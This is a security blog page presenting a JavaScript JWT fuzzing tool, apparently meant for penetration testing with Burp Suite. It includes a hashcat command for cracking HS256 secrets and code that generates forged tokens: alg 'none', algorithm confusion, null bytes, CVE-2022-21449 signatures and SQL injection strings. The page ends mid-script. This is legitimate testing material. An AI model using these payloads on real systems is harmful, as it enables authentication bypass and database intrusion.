<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="JWT Fuzzing" /><meta property="og:locale" content="en" /><meta name="description" content="The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. This includes an option to dynamically inject every field and subfield in the JWT header and body with SQL injection payloads as well as bad and invalid types. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite." /><meta property="og:description" content="The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. This includes an option to dynamically inject every field and subfield in the JWT header and body with SQL injection payloads as well as bad and invalid types. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite." /><link rel="canonical" href="/posts/jwt-fuzzing/" /><meta property="og:url" content="/posts/jwt-fuzzing/" /><meta property="og:site_name" content="Node Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-25T18:03:38+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="JWT Fuzzing" /><meta name="twitter:site" content="@todo" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-21T16:50:13+10:00","datePublished":"2021-05-25T18:03:38+10:00","description":"The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. This includes an option to dynamically inject every field and subfield in the JWT header and body with SQL injection payloads as well as bad and invalid types. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite.","headline":"JWT Fuzzing","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/jwt-fuzzing/"},"url":"/posts/jwt-fuzzing/"}</script><title>JWT Fuzzing | Node Security</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Node Security"><meta name="application-name" content="Node Security"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><body><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"> <img src="/assets/icon.webp" width="112" height="112" alt="avatar" onerror="this.style.display='none'"> </a><div class="site-title"> <a href="/">Node Security</a></div><div class="site-subtitle fst-italic">Security & Programming Guides</div></div><ul class="nav flex-column flex-grow-1 w-100 ps-0"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tools/" class="nav-link"> <i class="fa-fw fas fa-tools"></i> <span>TOOLS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/O1dMate" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/todo" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['o1dmate','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container px-xxl-5"><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100" > <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>JWT Fuzzing</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4"><div class="post px-1 px-md-2"><h1 data-toc-skip>JWT Fuzzing</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1621929818" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > May 25, 2021 </em> </span> <span> Updated <em class="" data-ts="1650523813" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 21, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/todo">Alexander Wells</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="293 words" > <em>1 min</em> read</span></div></div></div><div class="post-content"><p>The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. This includes an option to dynamically inject every field and subfield in the JWT header and body with SQL injection payloads as well as bad and invalid types. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite.</p><p><a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a> Update: Payload generation has been updated to include payloads for CVE-2022-21449 “Psychic Signatures in Java”. More information regarding a PoC can be found on <a href="https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app">this</a> GitHub repo.</p><h1 id="crack-hs256-jwt-with-hashcat">Crack HS256 JWT with Hashcat</h1><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat.exe -m 16500 -a 0 -w 3 JWT_LIST WORD_LIST
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">JWT_LSIT</code> path to file containing JWTs to crack.<li><code class="language-plaintext highlighter-rouge">WORD_LIST</code> path to file containing (pass)word list (e.g. <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou</a>).<li><strong>NOTE</strong> that this only works for the <code class="language-plaintext highlighter-rouge">HS256</code> signing algorithm.</ul><h1 id="warning">WARNING</h1><p>Be <strong>VERY</strong> careful when pasting JWT tokens into arbitrary websites! JWT’s can grant access to systems and must be treated as confidential.</p><p><strong>ALL</strong> processing on this website is done <strong>client-side</strong>. However, this may not be case with other sites.</p><p>The value in the input field below is stored in session storage for temporary persistance (refreshes and changing pages). This is cleared when your browser/tab is closed. If you don’t want tokens stored at all, update the option below:</p><p><input type="radio" id="storeJwtToken" name="storeJwtToken" onchange="radioChange(true)" /> <label for="storeJwtToken">Temp Store</label><br /> <input type="radio" id="doNotStoreJwtToken" name="storeJwtToken" onchange="radioChange(false)" /> <label for="doNotStoreJwtToken">Do not Temp Store</label></p><h1 id="insert-jwt">Insert JWT</h1><style> .inputField { width: 100%; color: #bfbfbf; background-color: #252525; border-block-color: #252525; resize: none; outline: none; border: none; border-radius: 6px; padding: 1rem; margin-right: 1rem; font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; } .textArea { width: 100%; color: #bfbfbf; background-color: #252525; border-block-color: #252525; resize: none; outline: none; border: none; border-radius: 6px; padding: 1rem; margin-right: 1rem; font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; white-space: pre-wrap; } .buttonStyle { cursor: pointer; border: none; border-radius: 3px; color: #ddd; margin-top: 0.5rem; background-color: #0072B5; } .buttonStyle:hover { box-shadow: 0px 0px 15px 5px rgb(0, 114, 181); }</style><p><button type="button" class="buttonStyle" onclick="generateTestJwt()">Generate Example JWT</button> <button type="button" class="buttonStyle" onclick="clearJwt()">Clear JWT</button></p><textarea id="jwtPayload" name="jwtPayload" spellcheck="false" placeholder="Paste JWT Token here ..." class="inputField" rows="4" oninput="jwtTokenChanged()"></textarea><h3 id="errorsWithJwt"><span class="me-2"></span><a href="#errorsWithJwt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div id="mainBlock" style="display: none;"> <input type="radio" id="doNotGenPayloads" name="genPayloadsOption" onchange="radioChangePayloads(false)" /> <label for="doNotGenPayloads">Do not Generate All Payloads</label><br /> <input type="radio" id="genPayloads" name="genPayloadsOption" onchange="radioChangePayloads(true)" /> <label for="genPayloads">Generate ALL Payloads (Dynamically Inject ALL JWT fields)</label><h1>JWT Data</h1><i>You can edit the below data</i><br /> <button type="button" class="buttonStyle" onclick="jwtTokenChanged()">Restore Data</button><h2>Header</h2><textarea id="jwtHeader" class="textArea" spellcheck="false" oninput="jwtFieldEdited('jwtFieldHeader')"> </textarea><h2>Payload</h2><textarea id="jwtBody" class="textArea" spellcheck="false" oninput="jwtFieldEdited('jwtFieldPayload')"> </textarea><ul id="sessionInfo"><li><span>Session length is <span id="jwtSessionTime"></span>.</span><br /><li><span id="jwtIssuedAt"></span><br /><li><span id="jwtExpiresAt">JWT is <span id="jwtExpiresAt1"></span><span id="jwtExpiresAt2"></span></span><br /></ul><h2>Signature</h2><textarea id="jwtSignature" class="textArea" spellcheck="false" oninput="jwtFieldEdited('jwtFieldSignature')"> </textarea><h3 id="jwtFieldsError"><span class="me-2"></span><a href="#jwtFieldsError" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div id="secondaryBlock"><h1>Suggested Modifications</h1><ul id="suggestedPayloads"></ul><button type="button" class="buttonStyle" onclick="copyAllToClipboard()">Copy Payloads to Clipboard</button> <button id="flipShowDecodedJwtsButton" type="button" class="buttonStyle" onclick="flipShowDecodedJwts()">Show Decoded JWTs</button><p id="totalPayloads"></p><div id="payloadList"></div></div></div><script> const RAW_BAD_STRINGS = [ 'c̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈', '̡͓̞ͅc҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰', '̗̺͖̹W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫', 'Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮', 'Ｔｈｅ', '𝐓𝐡𝐞', '𝕿𝖍𝖊', '𝑻𝒉𝒆', '𝓣𝓱𝓮', '𝕋𝕙𝕖', '𝚃𝚑𝚎', '⒯⒣⒠', '🚾 🆒 🆓', '0️⃣ 1️⃣ 2️⃣ ', '１２３', '١٢٣', 'ᴉs ɐ', 'Ω≈ç√∫˜µ≤≥÷', '⁰⁴⁵', '₀₁₂', '⁰⁴⁵₀₁₂', 'ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็', ]; const BAD_PAYLOADS = [ 'Y8yszJ9ozaFhzKvMu8yvzZhvzKvMn8yWzY3MmcydzYlzzJfMpsyyLsyozLnNiA==', 'zKHNk8yezYVj0onNlMyrzZbNk82HzZbNhWjMtcykzKPNms2Uw6HMl8y8zZXNhW/MvMyjzKVzzLHNiMy6zJbMpsy7zaIuzJvMlsyezKDMq8yw', 'zJfMus2WzLlXzZnMnsydzZTNh82dzYVhzY/Nk82UzLnMvMyjbMy0zZTMsMykzJ/NlOG4vcyr', 'WsyuzJ7MoM2ZzZTNheG4gMyXzJ7NiMy7zJfhuLbNmc2OzK/MucyezZNHzLtPzK3Ml8yu', '77y0772I772F', '8J2Qk/CdkKHwnZCe', '8J2Vv/Cdlo3wnZaK', '8J2Ru/CdkonwnZKG', '8J2To/Cdk7HwnZOu', '8J2Vi/CdlZnwnZWW', '8J2ag/CdmpHwnZqO', '4pKv4pKj4pKg', '8J+aviDwn4aSIPCfhpM=', 'MO+4j+KDoyAx77iP4oOjIDLvuI/ig6Mg', '77yR77yS77yT', '2aHZotmj', '4bSJcyDJkA==', 'zqniiYjDp+KImuKIq8ucwrXiiaTiiaXDtw==', '4oGw4oG04oG1', '4oKA4oKB4oKC', '4oGw4oG04oG14oKA4oKB4oKC', '4LiU4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmH4LmH4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmH4LmH4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmH4LmH4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmH4LmH4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmH4LmH4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmH4LmH4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmH4LmH4LmJ4LmJ4LmJ4LmJ4LmJ4LmH4LmH4LmH4LmHIOC4lOC5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5h+C5h+C5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5h+C5h+C5ieC5ieC5ieC5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5h+C5h+C5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5h+C5h+C5ieC5ieC5ieC5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5h+C5h+C5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5h+C5h+C5ieC5ieC5ieC5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5h+C5h+C5ieC5ieC5ieC5ieC5ieC5h+C5h+C5h+C5hyDguJTguYnguYnguYnguYnguYnguYfguYfguYfguYfguYfguYnguYnguYnguYnguYnguYfguYfguYfguYfguYfguYnguYnguYnguYnguYnguYnguYnguYnguYfguYfguYfguYfguYfguYnguYnguYnguYnguYnguYfguYfguYfguYfguYfguYnguYnguYnguYnguYnguYnguYnguYnguYfguYfguYfguYfguYfguYnguYnguYnguYnguYnguYfguYfguYfguYfguYfguYnguYnguYnguYnguYnguYnguYnguYnguYfguYfguYfguYfguYfguYnguYnguYnguYnguYnguYfguYfguYfguYc=', ].map(x => atob(x)); const SQL_AND_BAD_TYPES_PAYLOADS = [ `'`, '`', `')`, '`)', `'))`, '`))', `';--`, '`;--', `');--`, '`);--', `'));--`, '`));--', `' OR 1=1;--`, '` OR 1=1;--', `') OR 1=1;--`, '`) OR 1=1;--', `')) OR 1=1;--`, '`)) OR 1=1;--', `' UNION SELECT 1;--`, `' UNION SELECT 1,1;--`, `' UNION SELECT 1,1,1;--`, `' UNION SELECT 1,1,1,1;--`, `' UNION SELECT 1,1,1,1,1;--`, `' UNION SELECT 1,1,1,1,1,1;--`, '` UNION SELECT 1;--', '` UNION SELECT 1,1;--', '` UNION SELECT 1,1,1;--', '` UNION SELECT 1,1,1,1;--', '` UNION SELECT 1,1,1,1,1;--', '` UNION SELECT 1,1,1,1,1,1;--', 'JWS', 'JWE', null, [], [[]], [[[]]], [{}], [null], {}, 0, 1, false, true, '%00', '\x00', '5.604991216397929e-314', '5.604991216397929e+314', '5.604991216397929e-98765', '5.604991216397929e+98765', '-5.604991216397929e-314', '-5.604991216397929e+314', '-5.604991216397929e-98765', '-5.604991216397929e+98765', '__REPLACE__THIS__1__', '__REPLACE__THIS__2__', (new Date()), ]; const LARGE_DIGIT_STRING = '9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999'; const HUGE_DIGIT_STRING = '9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999'; let showDecodedJwts = false; let generateAllPayloads = false; function flipShowDecodedJwts() { if (showDecodedJwts) { showDecodedJwts = false; document.getElementById('flipShowDecodedJwtsButton').innerText = "Show Decoded JWTs"; } else { showDecodedJwts = true; document.getElementById('flipShowDecodedJwtsButton').innerText = "Show Encoded JWTs"; } createPayloads(); } function traverseObject(originalObj, depthObj, payloadList, payloadsToAdd) { Object.keys(depthObj).forEach(key => { if (key === 'prototype' || key === '__proto__') return; let originalValue = depthObj[key]; if (typeof(originalValue) === 'object' && originalValue !== null && originalValue !== undefined) { traverseObject(originalObj, originalValue, payloadList, payloadsToAdd); } payloadsToAdd.forEach(payload => { depthObj[key] = payload; payloadList.push(JSON.parse(JSON.stringify(originalObj))); }); depthObj[key] = originalValue; }); } function generatePayloads(header, body, signature) { let payloads = []; let tempHeader = null; let tempBody = null; let currentTime = Math.floor(Date.now() / 1000); let tokenIAT = body.iat || body.nbf; let tokenEXP = body.exp; let tokenValidFor = tokenEXP-tokenIAT; /* Algorithm 'none' */ payloads.push("$$@@Algorithm 'none'@@$$"); payloads.push(joinComponents({...header, alg: 'none'}, body, signature)); /* Algorithm 'none' & Remove Signature */ payloads.push("$$@@Algorithm 'none' & Remove Signature@@$$"); payloads.push(joinComponents({...header, alg: 'none'}, body, null)); /* Null Byte Injection */ payloads.push("$$@@Null Byte Injection@@$$"); payloads.push([btoa('\x00' + JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '\x00').replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '\x00').replace(/\=/g, '')].join('.')); try { let convertedSignature = signature.replace(/-/g, '+').replace(/_/g, '/'); payloads.push(joinComponents(header, body, btoa('\x00' + atob(convertedSignature)))); payloads.push(joinComponents(header, body, btoa(atob(convertedSignature) + '\x00'))); } catch (err) {} payloads.push(joinComponents({...header, alg: header.alg+'\x00'}, body, signature)); payloads.push(joinComponents({...header, alg: header.alg+'\x00'}, body, null)); payloads.push(joinComponents({...header, alg: '\x00'+header.alg}, body, signature)); payloads.push(joinComponents({...header, alg: '\x00'+header.alg}, body, null)); /* Modify Algorithms */ payloads.push("$$@@Modify Algorithms@@$$"); if(header.alg.startsWith('HS')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS', 'RS')}, body, signature)); if(header.alg.startsWith('RS')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS', 'HS')}, body, signature)); if(header.alg.startsWith('ES')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES', 'HS')}, body, signature)); if(header.alg.startsWith('PS')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS', 'HS')}, body, signature)); if(header.alg.startsWith('HS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS256', 'HS512')}, body, signature)); if(header.alg.startsWith('HS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS384', 'HS512')}, body, signature)); if(header.alg.startsWith('HS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS512', 'HS256')}, body, signature)); if(header.alg.startsWith('RS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS256', 'RS512')}, body, signature)); if(header.alg.startsWith('RS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS384', 'RS512')}, body, signature)); if(header.alg.startsWith('RS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS512', 'RS256')}, body, signature)); if(header.alg.startsWith('ES256')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES256', 'ES512')}, body, signature)); if(header.alg.startsWith('ES384')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES384', 'ES512')}, body, signature)); if(header.alg.startsWith('ES512')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES512', 'ES256')}, body, signature)); if(header.alg.startsWith('PS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS256', 'PS512')}, body, signature)); if(header.alg.startsWith('PS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS384', 'PS512')}, body, signature)); if(header.alg.startsWith('PS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS512', 'PS256')}, body, signature)); /* Modify Algorithms & Remove Signature */ payloads.push("$$@@Modify Algorithms & Remove Signature@@$$"); if(header.alg.startsWith('HS')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS', 'RS')}, body, null)); if(header.alg.startsWith('RS')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS', 'HS')}, body, null)); if(header.alg.startsWith('ES')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES', 'HS')}, body, null)); if(header.alg.startsWith('PS')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS', 'HS')}, body, null)); if(header.alg.startsWith('HS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS256', 'HS512')}, body, null)); if(header.alg.startsWith('HS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS384', 'HS512')}, body, null)); if(header.alg.startsWith('HS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS512', 'HS256')}, body, null)); if(header.alg.startsWith('RS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS256', 'RS512')}, body, null)); if(header.alg.startsWith('RS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS384', 'RS512')}, body, null)); if(header.alg.startsWith('RS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS512', 'RS256')}, body, null)); if(header.alg.startsWith('ES256')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES256', 'ES512')}, body, null)); if(header.alg.startsWith('ES384')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES384', 'ES512')}, body, null)); if(header.alg.startsWith('ES512')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES512', 'ES256')}, body, null)); if(header.alg.startsWith('PS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS256', 'PS512')}, body, null)); if(header.alg.startsWith('PS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS384', 'PS512')}, body, null)); if(header.alg.startsWith('PS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS512', 'PS256')}, body, null)); /* Modify Algorithms & Remove Signature */ payloads.push("$$@@Modify Algorithms & Remove Signature@@$$"); /* Psychic Signatures */ payloads.push("$$@@Psychic Signatures@@$$"); payloads.push(joinComponents({...header, alg: 'ES256'}, body, 'MAYCAQACAQA')); payloads.push(joinComponents({...header, alg: 'ES384'}, body, 'MAYCAQACAQA')); payloads.push(joinComponents({...header, alg: 'ES512'}, body, 'MAYCAQACAQA')); /* Invalid Payload Base64 */ payloads.push("$$@@Invalid Payload Base64@@$$"); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'a', signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'aa', signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'aaa', signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'aaaa', signature].join('.')); /* Invalid Header JSON */ payloads.push("$$@@Invalid Header JSON@@$$"); payloads.push([btoa(JSON.stringify(header) + '}').replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header) + '"').replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); BAD_PAYLOADS.forEach(badPayload => { payloads.push([badPayload, btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); }); RAW_BAD_STRINGS.forEach(badPayload => { payloads.push([badPayload, btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); }); /* Invalid Payload JSON */ payloads.push("$$@@Invalid Payload JSON@@$$"); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '}').replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '"').replace(/\=/g, ''), signature].join('.')); /* Invalid Algorithm with Bad Strings*/ payloads.push("$$@@Invalid Algorithm with Bad Strings@@$$"); BAD_PAYLOADS.forEach(badPayload => { payloads.push(joinComponents({...header, alg: badPayload}, body, signature)); }); /* Invalid Signature */ payloads.push("$$@@Invalid Signature@@$$"); payloads.push(joinComponents(header, body, 'a')); payloads.push(joinComponents(header, body, signature+'a')); /* Invalid Signature with Bad Strings */ payloads.push("$$@@Invalid Signature with Bad Strings@@$$"); BAD_PAYLOADS.forEach(badPayload => { payloads.push(joinComponents(header, body, btoa(badPayload))); payloads.push(joinComponents(header, body, badPayload)); }); RAW_BAD_STRINGS.forEach(badPayload => { payloads.push(joinComponents(header, body, badPayload)); }); /* Modify IssuedAt/NotBefore (iat/nbf) & Expiration (exp) */ payloads.push("$$@@Modify IssuedAt/NotBefore (iat/nbf) & Expiration (exp)@@$$"); if (body.hasOwnProperty('exp')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), exp: tokenEXP+1}, signature)); } if (body.hasOwnProperty('iat')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: tokenIAT+1}, signature)); } else if (body.hasOwnProperty('nbf')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), nbf: tokenIAT+1}, signature)); } if (body.hasOwnProperty('exp') && body.hasOwnProperty('iat')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: tokenIAT+1, exp: tokenEXP+1}, signature)); payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: currentTime, exp: currentTime+tokenValidFor}, signature)); } else if (body.hasOwnProperty('exp') && body.hasOwnProperty('nbf')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), nbf: tokenIAT+1, exp: tokenEXP+1}, signature)); payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), nbf: currentTime, exp: currentTime+tokenValidFor}, signature)); } payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: currentTime, exp: currentTime+3597}, signature)); /* Remove Algorithm */ payloads.push("$$@@Remove Algorithm@@$$"); tempHeader = {...JSON.parse(JSON.stringify(header))}; delete tempHeader.alg; payloads.push(joinComponents(tempHeader, body, signature)); payloads.push(joinComponents(tempHeader, body, null)); /* Remove Type */ payloads.push("$$@@Remove Type@@$$"); tempHeader = {...JSON.parse(JSON.stringify(header))}; delete tempHeader.typ; payloads.push(joinComponents(tempHeader, body, signature)); payloads.push(joinComponents(tempHeader, 